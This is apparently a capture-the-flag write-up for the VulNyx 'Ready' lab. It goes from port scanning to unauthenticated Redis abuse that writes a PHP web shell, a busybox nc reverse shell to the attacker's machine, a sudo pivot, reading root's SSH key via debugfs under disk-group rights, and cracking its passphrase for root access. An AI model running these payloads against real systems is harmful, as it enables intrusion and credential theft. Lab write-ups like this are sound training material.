# VulNyx - Ready

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.18                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 14:54 +07
Nmap scan report for 10.11.5.18
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.16
8080/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
MAC Address: 08:00:27:B7:29:40 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.46 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.18/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.18/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

#### Ffuf
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ffuf -u http://10.11.5.18/FUZZ -w /usr/share/wordlists/dirb/common.txt -s

.htpasswd
.htaccess
.hta
index.html
server-status

┌──(dungcngo㉿kali)-[/tmp]
└─$ ffuf -u http://10.11.5.18:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -s

.htpasswd
.htaccess
index.html
.hta
server-status
```

### Shell
#### 6379/TCP (REDIS)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ redis-cli -h 10.11.5.18 
10.11.5.18:6379> ping
PONG
10.11.5.18:6379> 
```
We connect to the Redis service using redis-cli without providing a password, using a guest session.
```bash
10.11.5.18:6379> config set dir /var/www/html
OK
10.11.5.18:6379> config set dbfilename cmd.php
OK
10.11.5.18:6379> set cmd "<?php system($_GET['cmd']); ?>"
OK
10.11.5.18:6379> save
OK
```
- `config set dir /var/www/html`: Change the current Redis working directory (where Redis will save the `.rdb` data file) to `/var/www/html`.
- `config set dbfilename cmd.php`: Change the name of the Redis database backup file (the default is usually `dump.rdb`) to `cmd.php`.
- `set cmd "<?php system($_GET['cmd']); ?>"`: This PHP code snippet is essentially a basic Web Shell.

=> After this sequence of commands finishes running and Redis performs the data writing process to disk (the `save` command), a file named `cmd.php` will appear in the web directory of the server.

#### 8080/TCP (HTTP)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s --output - "http://10.11.5.18:8080/cmd.php?cmd=id" | strings
REDIS0009
        redis-ver
6.0.16
redis-bits
ctime
used-mem
aof-preamble
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
```
We have user `ben` and try to get a reverse shell by running commands:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.18:8080/cmd.php?cmd=busybox+nc+10.11.5.4+4444+-e+/bin/sh"
```
#### Shell (ben)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.18] 47976
id ; hostname
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
ready
bash -pi
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
ben@ready:/var/www/html$
```
#### Flags (ben-user.txt)
```bash
ben@ready:/var/www/html$ cd ~
ben@ready:/home/ben$ ls
user.txt
ben@ready:/home/ben$ cat user.txt 
e5d3f520423fdef77195ac688ecc27cb
```

#### Shell (peter)
```bash
ben@ready:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for ben on ready:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on ready:
    (peter) NOPASSWD: /usr/bin/bash
```

```bash
ben@ready:/var/www/html$ sudo -u peter /usr/bin/bash
sudo -u peter /usr/bin/bash
peter@ready:/var/www/html$ id ; hostname
id ; hostname
uid=1001(peter) gid=1001(peter) groups=1001(peter)
ready
ben@ready:/var/www/html$ sudo -u peter /usr/bin/bash
sudo -u peter /usr/bin/bash
peter@ready:/var/www/html$ find / -name user.txt 2>/dev/null |xargs cat
find / -name user.txt 2>/dev/null |xargs cat
```
Nothing...

### Privilege Escalation

#### Enumeration
```bash
ben@ready:/home/ben$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
```

#### Abuse
```bash
ben@ready:/home/ben$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.9G  1.5G  5.1G  23% /
udev            473M     0  473M   0% /dev
tmpfs           489M     0  489M   0% /dev/shm
tmpfs            98M  500K   98M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
ben@ready:/home/ben$ /usr/sbin/debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,02E266E7A66462FE

tTN5G66QaZHsjOSYG8pFEQqUJUC4lw+WzHs3hbml1+zuLPmnDvUapYFB/4IgQNG2
jp1tebAwENVz/CdS3paB60NB9uosYXHa60Sbi7a31Ej6QqH10UnN/NROSEhqZkt+
dUcQspoDJIvHyvdhm4lIVizfvw1i9epxY+aB9W7vscpN1HAq37WdOn62nnEccLRs
wShZgOeOLTUo5j+C0oQZDi11ZJxEFiwwCFkOqZ+ZEQgshQqgG8PjMvedwuQcFjpN
wgFyQl0ZzGTzaj1iZntc/7G1/9WqXyk3IkpICucALCaSlCZ3Oh0kJd12W27vTKdO
kBpXNU8cgjc+jbIKveFZe6+ZuMwr3Lb9p+f+m7ktcTk/AFxSObuFnHBZN52VE/F4
lVK8vR7Om8qg34REgbvkmrBttg7x4AzUsTZ1WPPJqu3VS0SGVyq8vkpA2ngHmMBC
h3Ca0Xjua55GzCFBGePrQmqOd8jKZ0W6HBfCQyGB/dGg57mKNQy1OSIR4XtFYDYN
wNGTgr4KPebWf1CYRg2nleu3DD3sezutvoVMLJdzoeaLrCPX0pdfEhBase7n72Gy
Q6zqrk07p5GQeuL3tfhBsbHqgK899IMPr2VZPwvaoibDF66UJ1unfEXiPzTTHDo9
5MTR1GK7HYnmtypx3OpCDJMFGwaJgx+o944cxX9DQ63pgwx1R34RoQRfIgqUUrsG
NhEkLvrYFMnlK/dSmouuNFvd868zBlMByQyVYoepyHGhsGDuAP4Mhx7L1Gbj4dRS
dMgfgLN0lM0G+P9QvmmX7TuH1MU1IIfZZw9dCfdUqVVKyegA2RQ7fZG9D8o3l1J0
bIj0VJE7ykqqZEndzgBGRw3bEu3/OKpJM2UFqr/pPlu1w1bVIzHrTPNI5nk6dm77
n/TqwSgU2EQDWK88Z8TORZvuoNA3FelyzxCfRC2HLv0+QrVbyY7dLf3oLH0Zq+gK
1OYVrTKbe4pu0J2R7jZw20pLWeEZPuSE3RmVwcSsVzwb6dBk5rMkwCE5gG1qNh1U
koCqtHzXveisx5I7KrvBj5RTaK/aPX/v8BS/oh8AmiQr2Pqq9K+aQScP2XYh691x
yfVoFGJrZMcG5VD3QxrgWamgcHhug2LotpRbxjc777uK/muI9rUSQLYC06H2Cdf/
kRUH9Ohf3ZrVXpcCMhuCBbOxYBr+TAGjwJIBAYuFMBqhZ4gyaZhxJMCBhQOJHy6c
xR2cUdOAUh9lY40/o0Pwf+5GWiX2u5KmzcZ9iLdJ4NtgYiYMjGMe+0G37PdCXJvG
D+VsowoqCou916TMZUKpYSkzj8q3GLSib6CumVzKDesMLaYiZTOd1ShBqTlYjorp
Dlo5vrgUFk17OS8n0gtQuavBvN+2aM6gMOgiJrXfeLjzPGoY2ypHyNlbp/JI0/Y+
DfE+2kNqriAlvZps1mllIKITk1wNPQ3PVuBW9DkvrSUW7Ye+oMK3WoiQkY4qyu+2
pN0okmXmT5ygTq9KBQUEtjU8RnY27y34nYwCQus0HCA+FfRoxDbJYl0sN2g/Mzjq
PWVlSZLxzcya8sxPBA8gto3H5BxFnTxRXbCBTjTL09imi3QMl9K1emUlG8rSpBsI
-----END RSA PRIVATE KEY-----
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano id_rsa                 
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh2john id_rsa > id_rsa.hash
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash --fork=4 --rules
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Each node loaded 1/4 of wordfile to memory (about 33 MB/node)
shelly           (id_rsa)     
3 1g 0:00:00:05 DONE (2026-05-19 16:46) 0.1742g/s 42.68p/s 42.68c/s 42.68C/s shelly
Press 'q' or Ctrl-C to abort, almost any other key for status
shelly           (id_rsa)     
1 1g 0:00:00:16 DONE (2026-05-19 16:46) 0.06049g/s 216928p/s 216928c/s 216928C/s shelly
Waiting for 3 children to terminate
4 0g 0:00:00:15 DONE (2026-05-19 16:46) 0g/s 178806p/s 178806c/s 178806C/s DL650
2 0g 0:00:00:16 DONE (2026-05-19 16:46) 0g/s 159865p/s 159865c/s 159865C/s NUMRRA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We have password of `id_rsa` is `shelly`.

```bash
ben@ready:/home/ben$ chmod 700 id_rsa 
ben@ready:/home/ben$ ls -la
total 44
drwx------ 4 ben  ben  4096 May 19 11:53 .
drwxr-xr-x 4 root root 4096 Apr 17  2023 ..
lrwxrwxrwx 1 root root    9 Jul 19  2022 .bash_history -> /dev/null
-rwx------ 1 ben  ben   220 Jul 19  2022 .bash_logout
-rwx------ 1 ben  ben  3526 Jul 19  2022 .bashrc
drwx------ 3 ben  ben  4096 Jul 19  2022 .local
-rwx------ 1 ben  ben   807 Jul 19  2022 .profile
-rwx------ 1 ben  ben   102 Apr 17  2023 .rediserve.sh
-rw-r--r-- 1 ben  ben    66 Jul 19  2022 .selected_editor
drwx------ 2 ben  ben  4096 May 19 11:53 .ssh
-rwx------ 1 ben  ben  2066 May 19 11:50 id_rsa
-r-------- 1 ben  ben    33 Apr 17  2023 user.txt
ben@ready:/home/ben$ ssh -i id_rsa root@localhost
Enter passphrase for key 'id_rsa': 
Linux ready 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
Last login: Sat Nov 29 12:39:38 2025
root@ready:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
ready
```
#### Flagfs
```bash
root@ready:~# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
e5d3f520423fdef77195ac688ecc27cb
```

***You are welcome!***
